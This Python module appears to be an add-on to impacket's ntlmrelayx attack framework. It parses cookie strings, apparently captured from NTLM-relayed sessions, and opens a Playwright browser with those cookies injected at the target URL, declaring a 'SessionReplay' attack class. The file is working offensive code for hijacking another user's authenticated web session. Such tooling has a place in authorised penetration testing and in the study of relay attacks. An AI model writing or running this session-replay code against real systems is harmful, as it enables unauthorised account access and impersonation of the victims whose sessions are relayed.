import datetime
import json
import subprocess
import sys
from urllib.parse import urlparse

from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASSES = ["SessionReplay"]

_SEPARATOR = "-" * 72


SUPPORTED_BROWSERS = ("chromium", "firefox", "webkit")

# Embedded script run in a detached subprocess to keep the browser alive
_BROWSER_LAUNCH_SCRIPT = """\
import json, sys
from playwright.sync_api import sync_playwright

data = json.loads(sys.stdin.read())
target_url = data["target_url"]
cookies    = data["cookies"]
browser_id = data.get("browser", "chromium")

with sync_playwright() as pw:
    launcher = getattr(pw, browser_id)
    browser  = launcher.launch(headless=False)
    ctx      = browser.new_context()
    ctx.add_cookies(cookies)
    page = ctx.new_page()
    page.goto(target_url)
    page.wait_for_event("close", timeout=0)
    ctx.close()
    browser.close()
"""


def _normalize_url(url: str) -> str:
    # make sure URL has a scheme and fall back to http:// if not
    if "://" not in url:
        return "http://" + url
    return url


def ensure_playwright_browser(browser_type: str = "chromium") -> bool:
    if browser_type not in SUPPORTED_BROWSERS:
        LOG.error(
            "[!] Unsupported browser '%s'. Choose from: %s",
            browser_type,
            ", ".join(SUPPORTED_BROWSERS),
        )
        return False

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        LOG.error(
            "[!] --open-browser requires playwright. Re-install if this issue persists."
        )
        return False

    # Try launching a headless browser to confirm the binary exists.
    try:
        with sync_playwright() as pw:
            browser = getattr(pw, browser_type).launch(headless=True)
            browser.close()
        LOG.info("Playwright %s is ready.", browser_type)
        return True
    except Exception as exc:
        if (
            "executable" not in str(exc).lower()
            and "doesn't exist" not in str(exc).lower()
        ):
            LOG.error("[!] Unexpected Playwright error during preflight: %s", exc)
            return False

    LOG.info(
        "Playwright %s not found. Running 'playwright install %s' …",
        browser_type,
        browser_type,
    )
    result = subprocess.run(
        [sys.executable, "-m", "playwright", "install", browser_type],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        LOG.error(
            "'playwright install %s' failed (exit %d):\n%s",
            browser_type,
            result.returncode,
            result.stderr.strip(),
        )
        return False

    LOG.info("Playwright %s installed successfully.", browser_type)
    return True


def launch_browser_with_cookies(
    target_url: str,
    cookies_raw: list[str],
    browser_type: str = "chromium",
) -> None:
    parsed = urlparse(target_url)
    host = parsed.hostname or ""

    playwright_cookies: list[dict] = []
    for raw in cookies_raw:
        parts = [p.strip() for p in raw.split(";")]
        name, _, value = parts[0].partition("=")
        if not name.strip():
            continue
        cookie: dict = {
            "name": name.strip(),
            "value": value,
            "domain": host,
            "path": "/",
        }
        for attr in parts[1:]:
            akey, _, aval = attr.partition("=")
            akey = akey.strip().lower()
            if akey == "domain" and aval.strip():
                cookie["domain"] = aval.strip().lstrip(".")
            elif akey == "path" and aval.strip():
                cookie["path"] = aval.strip()
            elif akey == "httponly":
                cookie["httpOnly"] = True
            elif akey == "secure":
                cookie["secure"] = True
            elif akey == "samesite":
                samesite = aval.strip().capitalize()
                if samesite in ("Strict", "Lax", "None"):
                    cookie["sameSite"] = samesite
        playwright_cookies.append(cookie)

    payload = json.dumps(
        {
            "target_url": target_url,
            "cookies": playwright_cookies,
            "browser": browser_type,
        }
    ).encode()

    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", _BROWSER_LAUNCH_SCRIPT],
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        proc.stdin.write(payload)
        proc.stdin.close()
        LOG.info(
            "Browser (%s) launched (pid %d) with %d cookie(s) for %s",
            browser_type,
            proc.pid,
            len(playwright_cookies),
            target_url,
        )
    except Exception as exc:
        LOG.error("Failed to spawn browser subprocess: %s", exc)
